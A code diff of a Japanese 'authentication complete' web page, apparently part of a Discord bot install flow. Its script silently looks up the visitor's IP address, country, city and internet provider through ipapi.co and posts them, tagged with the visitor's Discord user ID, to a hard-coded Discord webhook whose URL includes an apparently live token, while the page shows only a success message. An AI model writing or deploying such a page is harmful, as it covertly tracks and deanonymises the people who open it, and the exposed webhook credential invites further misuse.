@@ -3,22 +3,29 @@
 <head><meta charset="UTF-8"><title>認証完了</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
     <h1 id="status">認証処理中...</h1>
+    <p id="debug" style="color:#888;font-size:12px;"></p>
+
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
 
         async function process() {
-            const params = new URLSearchParams(window.location.search);
-            const state = params.get('state'); // ここに情報が入っている
+            const urlParams = new URLSearchParams(window.location.search);
+            const state = urlParams.get('state');
 
             if (!state) {
                 document.getElementById('status').innerText = "エラー: パラメータが不足しています";
                 return;
             }
 
-            // state (log_id=xxx&user_id=xxx) を分解
-            const stateParams = new URLSearchParams(state);
-            const logId = stateParams.get('log_id');
-            const userId = stateParams.get('user_id');
+            // 特殊な区切り文字 (LID_..._UID_...) を解析
+            let logId, userId;
+            try {
+                logId = state.split('LID_')[1].split('_UID_')[0];
+                userId = state.split('_UID_')[1];
+            } catch (e) {
+                document.getElementById('status').innerText = "解析エラー";
+                return;
+            }
 
             try {
                 const geoRes = await fetch('https://ipapi.co/json/');
@@ -28,18 +35,18 @@
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **ボット導入完了**: <@${userId}>`,
+                        content: `✅ **認証・導入完了**: <@${userId}>`,
                         embeds: [{
-                            title: "導入ユーザーのIP特定",
-                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\``,
+                            title: "ユーザー特定成功",
+                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\`\n**プロバイダ:** \`${geo.org}\``,
                             color: 0x43b581,
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-                document.getElementById('status').innerText = "✔ 認証・導入に成功しました。";
+                document.getElementById('status').innerText = "✔ 認証に成功しました。";
             } catch (e) {
-                document.getElementById('status').innerText = "エラーが発生しました。";
+                document.getElementById('status').innerText = "通信エラー";
             }
         }
         process();
